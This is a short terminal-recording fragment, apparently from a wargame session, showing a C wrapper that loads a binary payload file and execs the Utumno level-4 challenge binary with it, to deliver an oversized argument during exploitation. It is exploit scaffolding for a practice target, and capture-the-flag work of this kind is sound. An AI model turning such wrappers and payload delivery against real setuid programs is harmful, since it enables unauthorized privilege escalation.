[0.003, "o", "/* w.c -- a wrapper that execs utumno4 with our binary argv[2].\r\r\n * Python cannot pass a 64 KB argv with arbitrary bytes comfortably in\r\r\n * gdb, so the wrapper reads the payload from a file and execs. */\r\r\n#include <unistd.h>\r\r\n#include <stdio.h>\r\r\n\r\r\nint main(void)\r\r\n{\r\r\n    static char a2[70000];\r\r\n    FILE *f = fopen(\"a2.bin\", \"rb\");\r\r\n    size_t n = fread(a2, 1, sizeof a2, f);\r\r\n    fclose(f);\r\r\n    a2[n] = 0;\r\r\n    char *a[] = { \"/utumno/utumno4\", \"65599\", a2, 0 };\r\r\n    char *e[] = { 0 };\r\r\n    execve(\"/utumno/utumno4\", a, e);\r\r\n    return 1;\r\r\n}\r\r\n\r\r\n"]
[0.005, "o", "\u001b]3008;end=7a1cd518-b360-40dc-ac59-319efa1a9c5b;exit=success\u001b\\"]
